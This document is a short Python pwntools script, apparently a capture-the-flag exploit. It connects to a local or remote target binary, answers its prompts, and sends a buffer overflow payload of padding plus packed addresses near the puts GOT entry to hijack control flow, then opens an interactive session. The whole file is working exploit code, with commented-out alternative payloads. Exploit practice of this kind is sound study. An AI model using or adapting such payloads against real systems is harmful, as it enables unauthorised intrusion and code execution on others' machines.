import sys
from pwn import *

binary = sys.argv[1]
target = sys.argv[2]

if len(sys.argv) > 3:
    port = int(sys.argv[3])
    r = remote(target, port)
else:
    r = process(target)

elf = ELF(binary)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']

tmp = b''
while tmp != b'Give me your number: ':
    tmp = r.recv()
    print(tmp)

r.sendline(b'0')

while b'Here is your ticket' in tmp:
    tmp = r.recv()
    print(tmp)

while tmp == b'Sign your name: ':
    tmp = r.recv()
    print(tmp)

#r.sendline(flat('a'*120, p64(0x4012C5), p64(puts_got + 0xF0), p64(0x4013A1)))
r.sendline(flat('a'*112, p64(puts_got + 0xF0), p64(0x4013A1)))
tmp = b''
while tmp == b'Sign your name: ':
    tmp = r.recv()
    print(tmp)

r.sendline()
#r.interactive()
#r.sendline(b'0')
#r.sendline(flat('a'*120, p64(0x40129E)))

while True:
    print(r.recv())

r.interactive()
